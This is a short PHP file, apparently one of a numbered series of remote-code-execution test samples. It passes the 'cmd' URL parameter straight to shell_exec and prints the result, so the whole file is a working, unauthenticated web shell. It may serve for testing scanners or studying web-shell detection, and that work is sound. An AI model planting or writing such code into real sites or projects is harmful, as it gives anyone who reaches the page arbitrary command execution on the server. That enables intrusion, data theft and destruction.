<?php
// RCE test variation #926
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>